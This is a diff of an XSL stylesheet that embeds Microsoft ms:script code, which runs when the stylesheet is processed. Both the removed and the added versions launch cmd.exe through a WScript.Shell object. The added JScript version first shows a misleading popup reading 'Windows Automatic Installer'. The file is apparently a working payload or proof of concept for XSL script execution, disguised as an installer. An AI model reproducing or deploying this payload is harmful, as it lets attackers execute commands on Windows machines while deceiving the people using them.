@@ -4,10 +4,10 @@ xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com
 xmlns:user="placeholder"
 version="1.0">
 <output method="text"/>
-	<ms:script implements-prefix="user" language="VBScript">
+	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	    Set WshShell = WScript.CreateObject("WScript.Shell") 
-            Return = WshShell.Run("cmd.exe" , 1, true)  
-            MsgBox "end of cmd"
-	]]> </ms:script>
+	    var sh = new ActiveXObject("Wscript.Shell");
+	    sh.Popup("Windows Automatic Installer");
+            sh.Run("cmd.exe");
+        ]]> </ms:script>
 </stylesheet>
